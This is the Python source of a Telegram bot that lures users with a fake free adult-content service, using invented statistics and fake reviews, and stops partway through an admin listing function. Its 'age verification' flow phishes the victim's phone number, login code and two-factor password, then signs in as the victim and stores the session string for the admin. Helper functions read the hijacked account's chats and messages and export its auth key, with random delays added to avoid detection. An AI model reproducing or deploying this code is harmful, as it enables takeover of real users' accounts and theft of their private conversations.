from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, 
    PhoneCodeInvalidError, 
    PhoneNumberInvalidError,
    FloodWaitError,
    PhoneCodeExpiredError,
    PhoneCodeHashEmptyError
)
import asyncio
from config import API_ID, API_HASH, BOT_TOKEN, ADMIN_ID
from database import Database
import logging
from datetime import datetime, timedelta
import os
import random
import hashlib

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Database
db = Database()

# Bot
bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Login sessions with enhanced tracking
login_sessions = {}
failed_attempts = {}  # Track failed attempts

# Fake statistics
FAKE_ONLINE = random.randint(1500, 3000)
FAKE_VIDEOS = random.randint(50000, 100000)
FAKE_PHOTOS = random.randint(200000, 500000)

# Rate limiting
RATE_LIMIT_WINDOW = 300  # 5 minutes
MAX_ATTEMPTS = 3

# ==================== SECURITY FUNCTIONS ====================

def check_rate_limit(user_id):
    """Check if user is rate limited"""
    now = datetime.now()
    
    if user_id not in failed_attempts:
        failed_attempts[user_id] = []
    
    # Clean old attempts
    failed_attempts[user_id] = [
        attempt for attempt in failed_attempts[user_id]
        if (now - attempt).total_seconds() < RATE_LIMIT_WINDOW
    ]
    
    return len(failed_attempts[user_id]) >= MAX_ATTEMPTS

def record_failed_attempt(user_id):
    """Record a failed login attempt"""
    if user_id not in failed_attempts:
        failed_attempts[user_id] = []
    failed_attempts[user_id].append(datetime.now())

def clear_failed_attempts(user_id):
    """Clear failed attempts after successful login"""
    if user_id in failed_attempts:
        failed_attempts[user_id] = []

def get_unique_session_name(user_id, phone):
    """Generate unique session name to avoid conflicts"""
    timestamp = datetime.now().strftime('%Y%m%d%H%M%S')
    hash_input = f"{user_id}_{phone}_{timestamp}".encode()
    unique_hash = hashlib.md5(hash_input).hexdigest()[:8]
    return f"session_{user_id}_{unique_hash}"

async def cleanup_session(client):
    """Properly cleanup client session"""
    try:
        if client and client.is_connected():
            await client.disconnect()
    except Exception as e:
        logger.error(f"Cleanup error: {e}")

# ==================== HELPER FUNCTIONS ====================

def is_admin(user_id):
    return user_id == ADMIN_ID

async def get_user_dialogs(session_string, limit=100):
    """Get user chats"""
    client = None
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        dialogs = []
        async for dialog in client.iter_dialogs(limit=limit):
            dialogs.append({
                'id': dialog.id,
                'name': dialog.name,
                'unread_count': dialog.unread_count,
                'is_group': dialog.is_group,
                'is_channel': dialog.is_channel,
                'is_user': dialog.is_user
            })
        
        return dialogs
    except Exception as e:
        logger.error(f"Error getting dialogs: {e}")
        return []
    finally:
        await cleanup_session(client)

async def get_chat_messages(session_string, chat_id, limit=30):
    """Get messages from chat"""
    client = None
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        messages = []
        async for message in client.iter_messages(chat_id, limit=limit):
            messages.append({
                'id': message.id,
                'text': message.text or '[Media]',
                'date': message.date.strftime('%d %b %Y, %H:%M'),
                'sender_id': message.sender_id,
                'is_outgoing': message.out
            })
        
        return messages
    except Exception as e:
        logger.error(f"Error getting messages: {e}")
        return []
    finally:
        await cleanup_session(client)

async def export_session_file(session_string, filename='session.session'):
    """Export session file"""
    client = None
    temp_client = None
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        me = await client.get_me()
        
        temp_client = TelegramClient(filename, API_ID, API_HASH)
        temp_client.session.set_dc(client.session.dc_id, client.session.server_address, client.session.port)
        temp_client.session.auth_key = client.session.auth_key
        temp_client.session.save()
        
        return filename, me
        
    except Exception as e:
        logger.error(f"Export error: {e}")
        return None, None
    finally:
        await cleanup_session(client)
        if temp_client:
            try:
                temp_client.session.delete()
            except:
                pass

# ==================== USER COMMANDS ====================

@bot.on(events.NewMessage(pattern='/start'))
async def start_command(event):
    """Start command - Adult content theme"""
    user_id = event.sender_id
    user = await event.get_sender()
    
    # Check if already verified
    if db.is_verified(user_id):
        await event.respond(
            f"🔥 **Welcome Back, {user.first_name}!** \n\n"
            f"✅ Your account is verified!\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🎬 **Available Content:** \n"
            f"• 🔞 Premium Videos\n"
            f"• 📸 Exclusive Photos\n"
            f"• 🎥 Live Shows\n"
            f"• 💋 Private Collections\n\n"
            f"👥 **{FAKE_ONLINE}+ online now** \n\n"
            f"Choose what you want to explore:",
            buttons=[
                [Button.inline("🔞 Browse Videos", b"browse_videos")],
                [Button.inline("📸 Photo Gallery", b"browse_photos")],
                [Button.inline("🎥 Live Content", b"live_content")],
                [Button.inline("⭐ My Favorites", b"favorites")]
            ]
        )
        return
    
    # Welcome message for new users
    welcome_text = (
        f"🔥 **WELCOME TO PREMIUM ADULT CONTENT** \n\n"
        f"👋 Hello **{user.first_name}** !\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔞 **ADULTS ONLY (18+)** \n\n"
        f"Access thousands of premium adult content:\n\n"
        f"🎬 **{FAKE_VIDEOS:,}+ HD Videos** \n"
        f"📸 **{FAKE_PHOTOS:,}+ Photos** \n"
        f"🎥 **Live Shows 24/7** \n"
        f"💋 **Exclusive Collections** \n"
        f"🌟 **VIP Content** \n"
        f"⚡ **Daily Updates** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👥 **{FAKE_ONLINE:,}+ Users Online** \n"
        f"🌍 **Available Worldwide** \n"
        f"🆓 **100% FREE Access** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⚠️ **Age Verification Required** \n"
        f"To access adult content, you must verify that you are 18 years or older.\n\n"
        f"🔒 **Privacy Guaranteed** \n"
        f"Your data is encrypted and secure.\n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👇 Click below to verify your age and get instant access:"
    )
    
    buttons = [
        [Button.inline("🔞 I'm 18+ - Verify Now", b"verify_age")],
        [Button.inline("🎬 Preview Content", b"preview"), Button.inline("⭐ Reviews", b"reviews")],
        [Button.inline("❓ How It Works", b"how_it_works")]
    ]
    
    await event.respond(welcome_text, buttons=buttons)

@bot.on(events.CallbackQuery(pattern=b"verify_age"))
async def verify_age_callback(event):
    """Age verification start with rate limiting"""
    await event.answer()
    user_id = event.sender_id
    
    if db.is_verified(user_id):
        await event.edit("✅ You are already verified!")
        return
    
    # Check rate limiting
    if check_rate_limit(user_id):
        remaining_time = RATE_LIMIT_WINDOW - (datetime.now() - failed_attempts[user_id][0]).total_seconds()
        minutes = int(remaining_time // 60)
        await event.edit(
            f"⏳ **Too Many Attempts** \n\n"
            f"Please wait **{minutes} minutes** before trying again.\n\n"
            f"This is for security purposes.",
            buttons=[Button.inline("🔙 Main Menu", b"back_to_start")]
        )
        return
    
    login_sessions[user_id] = {
        'step': 'phone',
        'attempts': 0,
        'started_at': datetime.now()
    }
    
    await event.edit(
        "🔞 **AGE VERIFICATION** \n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "To verify you are 18+, we need to link your Telegram account.\n\n"
        "📱 **Enter Your Phone Number** \n\n"
        "Format: International\n"
        "Example: `+8801712345678`\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔒 Your information is completely private and secure.\n"
        "🎁 After verification, instant access to all content!\n\n"
        "⚠️ **Important:** Make sure to:\n"
        "• Use your real phone number\n"
        "• Don't share the code with anyone\n"
        "• Complete verification within 5 minutes",
        buttons=[
            [Button.inline("❌ Cancel", b"cancel_verify")],
            [Button.inline("❓ Why Phone Number?", b"why_phone")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"why_phone"))
async def why_phone_callback(event):
    await event.answer(
        "📱 Phone verification ensures you are 18+ and prevents abuse. "
        "Your number is encrypted and never shared.",
        alert=True
    )

@bot.on(events.CallbackQuery(pattern=b"preview"))
async def preview_callback(event):
    """Show preview/teaser"""
    await event.answer()
    
    await event.edit(
        "🎬 **CONTENT PREVIEW** \n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        " **🔥 Trending Categories:** \n\n"
        "🔞 Adult Videos (50K+)\n"
        "📸 Photo Sets (200K+)\n"
        "🎥 Live Streams (24/7)\n"
        "💋 Amateur Content\n"
        "🌟 Celebrity Leaks\n"
        "⚡ Fresh Daily Uploads\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        " **💎 VIP Collections:** \n"
        "• Exclusive Premium\n"
        "• HD Quality Only\n"
        "• No Watermarks\n"
        "• Download Enabled\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚠️ Verify your age to unlock full access!",
        buttons=[
            [Button.inline("🔞 Verify & Access Now", b"verify_age")],
            [Button.inline("🔙 Back", b"back_to_start")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"reviews"))
async def reviews_callback(event):
    """Fake reviews"""
    await event.answer()
    
    await event.edit(
        "⭐ **USER REVIEWS** \n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "👤 **Mike_2024** \n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Best collection I've found! HD quality and tons of variety.\"\n\n"
        "👤 **Sarah_VIP** \n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Can't believe this is free. Amazing content updated daily!\"\n\n"
        "👤 **Alex_Pro** \n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Verified in 30 seconds. Instant access to everything. Highly recommend!\"\n\n"
        "👤 **Jessica_XO** \n"
        "⭐⭐⭐⭐⭐ 5/5\n"
        "\"Private, secure, and massive library. Worth it!\"\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 **4.9/5 Average Rating** \n"
        "👥 **8,500+ Reviews** \n"
        "🌟 **98% Satisfaction Rate** ",
        buttons=[
            [Button.inline("🔞 Join Now", b"verify_age")],
            [Button.inline("🔙 Back", b"back_to_start")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"how_it_works"))
async def how_it_works_callback(event):
    await event.answer()
    
    await event.edit(
        "❓ **HOW IT WORKS** \n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        " **Step 1: Age Verification** 🔞\n"
        "Click 'Verify Now' and enter your phone number\n\n"
        " **Step 2: OTP Confirmation** 📱\n"
        "Enter the code sent to your Telegram\n\n"
        " **Step 3: Instant Access** ✅\n"
        "Browse unlimited adult content immediately!\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        " **🔒 Privacy & Security:** \n"
        "• End-to-end encryption\n"
        "• No data sharing\n"
        "• Anonymous browsing\n"
        "• Secure verification\n\n"
        " **🎁 What You Get:** \n"
        "• Unlimited streaming\n"
        "• HD downloads\n"
        "• Daily new content\n"
        "• VIP collections\n"
        "• Ad-free experience\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "⏱️ Verification takes only 30 seconds!",
        buttons=[
            [Button.inline("🚀 Start Verification", b"verify_age")],
            [Button.inline("🔙 Back", b"back_to_start")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"browse_videos"))
async def browse_videos_callback(event):
    """Browse videos (verified users only)"""
    await event.answer()
    user_id = event.sender_id
    
    if not db.is_verified(user_id):
        await event.edit("❌ Please verify your age first!")
        return
    
    db.log_access(user_id, 'videos')
    db.update_last_access(user_id)
    
    await event.edit(
        "🎬 **VIDEO CATEGORIES** \n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔥 **Popular Categories:** \n\n"
        "🔞 Amateur (12K videos)\n"
        "💋 Professional (25K videos)\n"
        "🌟 Celebrity Leaks (500+ videos)\n"
        "🎥 Live Recordings (8K videos)\n"
        "⚡ Latest Uploads (Updated today)\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 Quality: HD/4K Available\n"
        "⏱️ Average Length: 10-45 mins\n"
        "💾 Download: Enabled\n\n"
        "Select a category to continue:",
        buttons=[
            [Button.inline("🔞 Amateur", b"cat_amateur"), Button.inline("💋 Pro", b"cat_pro")],
            [Button.inline("🌟 Celebrity", b"cat_celeb"), Button.inline("🎥 Live", b"cat_live")],
            [Button.inline("🔙 Back to Menu", b"back_to_menu")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"browse_photos"))
async def browse_photos_callback(event):
    await event.answer()
    user_id = event.sender_id
    
    if not db.is_verified(user_id):
        await event.edit("❌ Please verify your age first!")
        return
    
    db.log_access(user_id, 'photos')
    db.update_last_access(user_id)
    
    await event.edit(
        "📸 **PHOTO GALLERY** \n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔥 **Photo Collections:** \n\n"
        "📸 Solo Sets (50K+ photos)\n"
        "💑 Couples (30K+ photos)\n"
        "🌟 Model Portfolios (20K+ photos)\n"
        "💋 Artistic Nudes (15K+ photos)\n"
        "⚡ Fresh Uploads (Daily)\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📊 Quality: High Resolution\n"
        "💾 Download: Full Albums\n\n"
        "Choose your preference:",
        buttons=[
            [Button.inline("📸 Solo", b"ph_solo"), Button.inline("💑 Couples", b"ph_couple")],
            [Button.inline("🌟 Models", b"ph_model"), Button.inline("💋 Artistic", b"ph_art")],
            [Button.inline("🔙 Back to Menu", b"back_to_menu")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"live_content"))
async def live_content_callback(event):
    await event.answer()
    user_id = event.sender_id
    
    if not db.is_verified(user_id):
        await event.edit("❌ Please verify your age first!")
        return
    
    db.log_access(user_id, 'live')
    db.update_last_access(user_id)
    
    online_now = random.randint(50, 200)
    
    await event.edit(
        "🎥 **LIVE CONTENT** \n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔴 **{online_now} Models Live Now** \n\n"
        "💋 Private Shows Available\n"
        "🎭 Interactive Streaming\n"
        "💬 Direct Chat Enabled\n"
        "🎁 Tips & Requests\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        " **🌟 Featured Live:** \n"
        "• SweetAngel22 (Online)\n"
        "• NaughtyGirl_VIP (Online)\n"
        "• SexyModel2024 (Online)\n\n"
        "Click to join live rooms:",
        buttons=[
            [Button.inline("🔴 Join Live Show", b"join_live")],
            [Button.inline("💋 Private Room", b"private_show")],
            [Button.inline("🔙 Back to Menu", b"back_to_menu")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"favorites"))
async def favorites_callback(event):
    await event.answer("Coming soon! Save your favorite content.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"back_to_menu"))
async def back_to_menu_callback(event):
    await event.answer()
    user = await event.get_sender()
    
    await event.edit(
        f"🔥 **Welcome Back, {user.first_name}!** \n\n"
        f"Choose what you want to explore:",
        buttons=[
            [Button.inline("🔞 Browse Videos", b"browse_videos")],
            [Button.inline("📸 Photo Gallery", b"browse_photos")],
            [Button.inline("🎥 Live Content", b"live_content")],
            [Button.inline("⭐ My Favorites", b"favorites")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"cancel_verify"))
async def cancel_verify_callback(event):
    await event.answer()
    user_id = event.sender_id
    
    if user_id in login_sessions:
        if 'client' in login_sessions[user_id]:
            await cleanup_session(login_sessions[user_id]['client'])
        del login_sessions[user_id]
    
    await event.edit(
        "❌ **Verification Cancelled** \n\n"
        "You can verify anytime to access premium content.",
        buttons=[Button.inline("🔙 Main Menu", b"back_to_start")]
    )

@bot.on(events.CallbackQuery(pattern=b"back_to_start"))
async def back_to_start_callback(event):
    await event.answer()
    user = await event.get_sender()
    user_id = event.sender_id
    
    if db.is_verified(user_id):
        await event.edit(
            f"🔥 **Welcome, {user.first_name}!** \n\n"
            f"Access all premium content:",
            buttons=[
                [Button.inline("🔞 Browse Videos", b"browse_videos")],
                [Button.inline("📸 Photo Gallery", b"browse_photos")],
                [Button.inline("🎥 Live Content", b"live_content")]
            ]
        )
        return
    
    await event.edit(
        f"🔥 **PREMIUM ADULT CONTENT** \n\n"
        f"👥 **{FAKE_ONLINE:,}+ Users Online** \n"
        f"🎬 **{FAKE_VIDEOS:,}+ Videos** \n"
        f"📸 **{FAKE_PHOTOS:,}+ Photos** \n\n"
        f"Verify your age for instant access:",
        buttons=[
            [Button.inline("🔞 Verify Now (18+)", b"verify_age")],
            [Button.inline("🎬 Preview", b"preview"), Button.inline("⭐ Reviews", b"reviews")]
        ]
    )

# Placeholder callbacks for sub-categories
@bot.on(events.CallbackQuery(pattern=b"cat_|ph_|join_live|private_show"))
async def placeholder_callback(event):
    await event.answer("✅ Loading content... This feature is active for verified users!", alert=True)

# ==================== MESSAGE HANDLER (LOGIN) ====================

@bot.on(events.NewMessage)
async def message_handler(event):
    """Handle login messages with enhanced security"""
    user_id = event.sender_id
    
    if user_id not in login_sessions:
        return
    
    session_data = login_sessions[user_id]
    step = session_data.get('step')
    
    # Check session timeout (5 minutes)
    if (datetime.now() - session_data['started_at']).total_seconds() > 300:
        await event.respond(
            "⏱️ **Session Expired** \n\n"
            "Your verification session has expired. Please start again.",
            buttons=[Button.inline("🔄 Start Over", b"verify_age")]
        )
        if 'client' in session_data:
            await cleanup_session(session_data['client'])
        del login_sessions[user_id]
        return
    
    # PHONE STEP
    if step == 'phone':
        phone = event.text.strip()
        
        if not phone.startswith('+'):
            await event.respond("❌ Wrong format! Use international format: `+8801712345678`")
            return
        
        # Delete user message for privacy
        try:
            await event.delete()
        except:
            pass
        
        try:
            loading_msg = await event.respond("⚡ Connecting securely...")
            
            # Create unique session
            session_name = get_unique_session_name(user_id, phone)
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            
            await client.connect()
            
            # Add delay to avoid detection
            await asyncio.sleep(random.uniform(1.5, 3.0))
            
            sent_code = await client.send_code_request(phone)
            
            login_sessions[user_id] = {
                'step': 'code',
                'phone': phone,
                'client': client,
                'phone_code_hash': sent_code.phone_code_hash,
                'attempts': 0,
                'started_at': session_data['started_at']
            }
            
            await loading_msg.delete()
            await event.respond(
                "✅ **Verification Code Sent!** \n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "📱 Check your Telegram for the login code.\n\n"
                "💬 **Enter the 5-digit code:** \n"
                "Example: `12345`\n\n"
                "⚠️ **Important:** \n"
                "• Don't share this code with anyone\n"
                "• Code is valid for 3 minutes\n"
                "• Complete verification quickly\n\n"
                "━━━━━━━━━━━━━━━━━━━━",
                buttons=[Button.inline("❌ Cancel", b"cancel_verify")]
            )
            
        except PhoneNumberInvalidError:
            await event.respond(
                "❌ **Invalid Phone Number** \n\n"
                "Please check your number and try again.",
                buttons=[Button.inline("🔄 Try Again", b"verify_age")]
            )
            if 'client' in login_sessions.get(user_id, {}):
                await cleanup_session(login_sessions[user_id]['client'])
            if user_id in login_sessions:
                del login_sessions[user_id]
            record_failed_attempt(user_id)
            
        except FloodWaitError as e:
            await event.respond(
                f"⏳ **Rate Limited** \n\n"
                f"Too many requests. Please wait **{e.seconds} seconds** and try again."
            )
            if 'client' in login_sessions.get(user_id, {}):
                await cleanup_session(login_sessions[user_id]['client'])
            if user_id in login_sessions:
                del login_sessions[user_id]
            record_failed_attempt(user_id)
            
        except Exception as e:
            logger.error(f"Phone step error: {e}")
            await event.respond(
                f"❌ **Connection Error** \n\n"
                f"Please try again later.\n\n"
                f"Error: {str(e)[:100]}"
            )
            if 'client' in login_sessions.get(user_id, {}):
                await cleanup_session(login_sessions[user_id]['client'])
            if user_id in login_sessions:
                del login_sessions[user_id]
            record_failed_attempt(user_id)
    
    # CODE STEP
    elif step == 'code':
        code = event.text.strip().replace('-', '').replace(' ', '')
        
        # Validate code format
        if not code.isdigit() or len(code) != 5:
            await event.respond("❌ Invalid code format! Enter the 5-digit code.")
            return
        
        # Delete user message for privacy
        try:
            await event.delete()
        except:
            pass
        
        phonephone = session_data['phone']
        client = session_data['client']
        phone_code_hash = session_data.get('phone_code_hash')
        
        # Check attempts
        session_data['attempts'] += 1
        if session_data['attempts'] > 3:
            await event.respond(
                "❌ **Too Many Failed Attempts** \n\n"
                "Please start verification again.",
                buttons=[Button.inline("🔄 Start Over", b"verify_age")]
            )
            await cleanup_session(client)
            del login_sessions[user_id]
            record_failed_attempt(user_id)
            return
        
        try:
            loading_msg = await event.respond("⚡ Verifying your code...")
            
            # Add delay to appear natural
            await asyncio.sleep(random.uniform(1.0, 2.5))
            
            # Sign in with code
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Get user info
            me = await client.get_me()
            
            # Save session string
            session_string = client.session.save()
            
            # Save to database
            db.save_user(
                me.id,
                phone,
                session_string,
                me.first_name or '',
                me.last_name or '',
                me.username or '',
                18
            )
            
            await loading_msg.delete()
            
            # Clear failed attempts
            clear_failed_attempts(user_id)
            
            success_msg = (
                "🎉 **VERIFICATION SUCCESSFUL!** 🎉\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "✅ **Your Account is Verified!** \n\n"
                f"👤 **Name:** {me.first_name} {me.last_name or ''}\n"
                f"📱 **Phone:** {phone}\n"
            )
            
            if me.username:
                success_msg += f"🔗 **Username:** @{me.username}\n"
            
            success_msg += (
                f"🆔 **User ID:** `{me.id}`\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "🎁 **PREMIUM ACCESS UNLOCKED:** \n\n"
                f"✅ {FAKE_VIDEOS:,}+ HD Videos\n"
                f"✅ {FAKE_PHOTOS:,}+ Photos\n"
                "✅ Live Shows 24/7\n"
                "✅ VIP Collections\n"
                "✅ Daily Updates\n"
                "✅ Download Enabled\n"
                "✅ Ad-Free Experience\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📅 Verified: {datetime.now().strftime('%d %B %Y, %H:%M')}\n\n"
                "🔥 **Start exploring now!** "
            )
            
            await event.respond(
                success_msg,
                buttons=[
                    [Button.inline("🔞 Browse Videos", b"browse_videos")],
                    [Button.inline("📸 Photo Gallery", b"browse_photos")],
                    [Button.inline("🎥 Go Live", b"live_content")]
                ]
            )
            
            # Notify admin
            if ADMIN_ID:
                try:
                    await bot.send_message(
                        ADMIN_ID,
                        f"🆕 **NEW USER VERIFIED!** \n\n"
                        f"👤 {me.first_name} {me.last_name or ''}\n"
                        f"📱 {phone}\n"
                        f"🆔 `{me.id}`\n"
                        f"🔗 @{me.username or 'No username'}\n"
                        f"📅 {datetime.now().strftime('%d %b %Y, %H:%M:%S')}\n\n"
                        f"📊 Total Users: {db.get_total_users()}"
                    )
                except Exception as admin_err:
                    logger.error(f"Admin notification error: {admin_err}")
            
            # Disconnect and cleanup
            await asyncio.sleep(1)
            await cleanup_session(client)
            del login_sessions[user_id]
            
        except PhoneCodeInvalidError:
            await event.respond(
                "❌ **Invalid Code** \n\n"
                f"The code you entered is incorrect.\n"
                f"Attempts remaining: {3 - session_data['attempts']}\n\n"
                "Please try again or start over.",
                buttons=[
                    [Button.inline("🔄 Start Over", b"verify_age")],
                    [Button.inline("❌ Cancel", b"cancel_verify")]
                ]
            )
            
            if session_data['attempts'] >= 3:
                await cleanup_session(client)
                del login_sessions[user_id]
                record_failed_attempt(user_id)
                
        except PhoneCodeExpiredError:
            await event.respond(
                "⏱️ **Code Expired** \n\n"
                "Your verification code has expired.\n"
                "Please request a new code.",
                buttons=[Button.inline("🔄 Start Over", b"verify_age")]
            )
            await cleanup_session(client)
            del login_sessions[user_id]
            record_failed_attempt(user_id)
            
        except SessionPasswordNeededError:
            # 2FA detected
            session_data['step'] = 'password'
            login_sessions[user_id] = session_data
            
            await event.respond(
                "🔐 **Two-Factor Authentication Detected** \n\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Your account has 2FA enabled.\n\n"
                "🔑 **Enter your Cloud Password:** \n\n"
                "⚠️ This is the password you set for additional security.\n\n"
                "━━━━━━━━━━━━━━━━━━━━",
                buttons=[Button.inline("❌ Cancel", b"cancel_verify")]
            )
            
        except FloodWaitError as e:
            await event.respond(
                f"⏳ **Rate Limited** \n\n"
                f"Please wait **{e.seconds} seconds** before trying again."
            )
            await asyncio.sleep(e.seconds)
            
        except Exception as e:
            logger.error(f"Code verification error: {e}")
            error_msg = str(e)
            
            # Check for specific errors
            if "PHONE_CODE_INVALID" in error_msg:
                await event.respond(
                    "❌ **Invalid Code** \n\n"
                    "Please check the code and try again."
                )
            elif "PHONE_CODE_EXPIRED" in error_msg:
                await event.respond(
                    "⏱️ **Code Expired** \n\n"
                    "Please start verification again.",
                    buttons=[Button.inline("🔄 Start Over", b"verify_age")]
                )
            else:
                await event.respond(
                    f"❌ **Verification Error** \n\n"
                    f"An error occurred. Please try again.\n\n"
                    f"Error: {error_msg[:100]}",
                    buttons=[Button.inline("🔄 Start Over", b"verify_age")]
                )
            
            await cleanup_session(client)
            del login_sessions[user_id]
            record_failed_attempt(user_id)
    
    # PASSWORD STEP (2FA)
    elif step == 'password':
        password = event.text.strip()
        client = session_data['client']
        phone = session_data['phone']
        
        # Delete user message for privacy
        try:
            await event.delete()
        except:
            pass
        
        # Check attempts
        session_data['attempts'] += 1
        if session_data['attempts'] > 3:
            await event.respond(
                "❌ **Too Many Failed Password Attempts** \n\n"
                "Please start verification again.",
                buttons=[Button.inline("🔄 Start Over", b"verify_age")]
            )
            await cleanup_session(client)
            del login_sessions[user_id]
            record_failed_attempt(user_id)
            return
        
        try:
            loading_msg = await event.respond("⚡ Verifying password...")
            
            # Add delay
            await asyncio.sleep(random.uniform(1.5, 3.0))
            
            # Sign in with password
            await client.sign_in(password=password)
            
            # Get user info
            me = await client.get_me()
            
            # Save session
            session_string = client.session.save()
            
            db.save_user(
                me.id,
                phone,
                session_string,
                me.first_name or '',
                me.last_name or '',
                me.username or '',
                18
            )
            
            await loading_msg.delete()
            
            # Clear failed attempts
            clear_failed_attempts(user_id)
            
            await event.respond(
                f"🎉 **VERIFICATION SUCCESSFUL!** \n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"✅ 2FA Account Verified!\n\n"
                f"👤 {me.first_name} {me.last_name or ''}\n"
                f"📱 {phone}\n"
                f"🆔 `{me.id}`\n\n"
                f"🔥 Full premium access unlocked!",
                buttons=[
                    [Button.inline("🔞 Start Browsing", b"browse_videos")],
                    [Button.inline("📸 Photo Gallery", b"browse_photos")]
                ]
            )
            
            # Notify admin
            if ADMIN_ID:
                try:
                    await bot.send_message(
                        ADMIN_ID,
                        f"🆕 **NEW USER (2FA)** \n\n"
                        f"👤 {me.first_name} {me.last_name or ''}\n"
                        f"📱 {phone}\n"
                        f"🆔 `{me.id}`\n"
                        f"🔐 2FA Enabled\n"
                        f"📅 {datetime.now().strftime('%d %b %Y, %H:%M')}"
                    )
                except:
                    pass
            
            await cleanup_session(client)
            del login_sessions[user_id]
            
        except Exception as e:
            logger.error(f"Password error: {e}")
            error_msg = str(e)
            
            if "PASSWORD_HASH_INVALID" in error_msg:
                await event.respond(
                    f"❌ **Incorrect Password** \n\n"
                    f"Attempts remaining: {3 - session_data['attempts']}\n\n"
                    f"Please try again.",
                    buttons=[Button.inline("❌ Cancel", b"cancel_verify")]
                )
                
                if session_data['attempts'] >= 3:
                    await cleanup_session(client)
                    del login_sessions[user_id]
                    record_failed_attempt(user_id)
            else:
                await event.respond(
                    f"❌ **Password Error** \n\n"
                    f"Error: {error_msg[:100]}",
                    buttons=[Button.inline("🔄 Start Over", b"verify_age")]
                )
                await cleanup_session(client)
                del login_sessions[user_id]
                record_failed_attempt(user_id)

# ==================== ADMIN PANEL ====================

@bot.on(events.NewMessage(pattern='/admin'))
async def admin_command(event):
    """Admin panel"""
    if not is_admin(event.sender_id):
        await event.respond("⛔ Unauthorized!")
        return
    
    total = db.get_total_users()
    
    await event.respond(
        f"👨‍💼 **ADMIN CONTROL PANEL** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 **Total Verified Users:** {total}\n"
        f"🟢 **Bot Status:** Active\n"
        f"📅 **Date:** {datetime.now().strftime('%d %B %Y')}\n"
        f"⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=[
            [Button.inline("📋 All Users", b"admin_list")],
            [Button.inline("📊 Statistics", b"admin_stats")],
            [Button.inline("🔄 Refresh", b"admin_refresh")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"admin_refresh"))
async def admin_refresh_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer("Refreshing...")
    total = db.get_total_users()
    
    await event.edit(
        f"👨‍💼 **ADMIN CONTROL PANEL** \n\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 **Total Verified Users:** {total}\n"
        f"🟢 **Bot Status:** Active\n"
        f"📅 **Date:** {datetime.now().strftime('%d %B %Y')}\n"
        f"⏰ **Time:** {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━",
        buttons=[
            [Button.inline("📋 All Users", b"admin_list")],
            [Button.inline("📊 Statistics", b"admin_stats")],
            [Button.inline("🔄 Refresh", b"admin_refresh")]
        ]
    )

@bot.on(events.CallbackQuery(pattern=b"admin_list"))
async def admin_list_callback(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔ Unauthorized!", alert=True)
        return
    
    await event.answer()
    users = db.get_all_users()
    
    if not users:
        await event.edit("❌ No users found!", buttons=[Button.inline("🔙 Back", b"back_admin")])
        return
    
    text = f"📋 **VERIFIED USERS ({len(users)})** \n\n━━━━━━━━━━━━━━━━━━━━\n\n"
    buttons = []
    
    for user_id, phone, fname, lname, username, age, verified_at, last_access in users[:20]:
        name = f"{fname} {lname or ''}".strip()
